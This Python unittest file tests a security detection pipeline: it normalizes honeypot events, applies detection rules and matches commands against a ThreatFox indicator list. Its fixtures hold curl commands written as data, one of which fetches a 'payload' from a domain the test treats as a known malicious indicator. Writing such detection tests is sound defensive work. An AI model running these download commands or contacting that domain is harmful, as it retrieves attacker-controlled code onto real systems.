from pathlib import Path
import unittest

from detection.ioc import IOCMatcher
from detection.normalize import normalize_event
from detection.pipeline import DetectionPipeline
from detection.rules import RuleEngine

ROOT = Path(__file__).resolve().parents[1]

class DetectionTests(unittest.TestCase):
    def test_cowrie_normalization(self):
        event = normalize_event({"eventid": "cowrie.command.input", "src_ip": "192.0.2.1", "input": "whoami"})
        self.assertEqual(event["source"], "cowrie")
        self.assertEqual(event["source_ip"], "192.0.2.1")
        self.assertEqual(event["command"], "whoami")

    def test_nested_common_schema_fields(self):
        event = normalize_event({"event": {"name": "probe"}, "source": {"ip": "192.0.2.9"}, "process": {"command_line": "whoami"}})
        self.assertEqual(event["event_id"], "probe")
        self.assertEqual(event["source_ip"], "192.0.2.9")
        self.assertEqual(event["command"], "whoami")

    def test_rule_engine_returns_multiple_alerts(self):
        event = normalize_event({"eventid": "cowrie.command.input", "input": "curl https://example.test/a"})
        self.assertEqual([a["rule_id"] for a in RuleEngine().evaluate(event)], ["DOWNLOAD_ACTIVITY"])

    def test_real_threatfox_csv_domain_match_from_command_url(self):
        matcher = IOCMatcher(ROOT / "data/threat_intel/threatfox_normalized.csv")
        event = normalize_event({"eventid": "cowrie.command.input", "input": "curl https://inquisitive8184.workers.dev/payload"})
        matches = matcher.match(event)
        self.assertTrue(matches)
        self.assertEqual(matches[0]["ioc"]["threatfox_id"], "1932291")

    def test_pipeline_rules_ioc_and_correlation(self):
        pipeline = DetectionPipeline(ROOT / "data/threat_intel/threatfox_normalized.csv")
        alerts = pipeline.process(ROOT / "tests/fixtures/synthetic_events.jsonl")
        types = {alert["alert_type"] for alert in alerts}
        rules = {alert["rule_id"] for alert in alerts}
        self.assertIn("rule_match", types)
        self.assertIn("ioc_match", types)
        self.assertIn("correlation", types)
        self.assertIn("ACCOUNT_ENUMERATION", rules)
        self.assertEqual(len(alerts), len({alert["alert_id"] for alert in alerts}))


    def test_uces_sha256_event_id_is_preserved(self):
        uid = "a" * 64
        event = normalize_event({
            "event_id": uid,
            "event_time": "2026-10-30T10:00:00Z",
            "source": "network",
            "event_type": "flow",
        })
        self.assertEqual(event["event_uid"], uid)

    def test_invalid_uces_event_id_is_not_used_as_uid(self):
        event = normalize_event({
            "event_id": "event-123",
            "event_time": "2026-10-30T10:00:00Z",
            "source": "network",
            "event_type": "flow",
        })
        self.assertIsNone(event["event_uid"])

    def test_missing_uces_event_id_remains_none(self):
        event = normalize_event({
            "event_time": "2026-10-30T10:00:00Z",
            "source": "network",
            "event_type": "flow",
        })
        self.assertIsNone(event["event_uid"])

    def test_pipeline_reports_invalid_json_line(self):
        import tempfile

        pipeline = DetectionPipeline(
            ROOT / "data/threat_intel/threatfox_normalized.csv"
        )

        with tempfile.NamedTemporaryFile(
            mode="w",
            suffix=".jsonl",
            encoding="utf-8",
            delete=False,
        ) as handle:
            handle.write('{"event_type": "login"}\n')
            handle.write('{"event_type": invalid-json}\n')
            input_path = Path(handle.name)

        try:
            with self.assertRaisesRegex(ValueError, "Invalid JSON on line 2"):
                pipeline.process(input_path)
        finally:
            input_path.unlink(missing_ok=True)

    def test_pipeline_skips_non_dictionary_json_values(self):
        import json
        import tempfile

        pipeline = DetectionPipeline(
            ROOT / "data/threat_intel/threatfox_normalized.csv"
        )

        values = [None, "hello", 123, ["login", "command"]]

        with tempfile.NamedTemporaryFile(
            mode="w",
            suffix=".jsonl",
            encoding="utf-8",
            delete=False,
        ) as handle:
            for value in values:
                handle.write(json.dumps(value) + "\n")
            input_path = Path(handle.name)

        try:
            alerts = pipeline.process(input_path)
            self.assertEqual(alerts, [])
        finally:
            input_path.unlink(missing_ok=True)


if __name__ == "__main__":
    unittest.main()
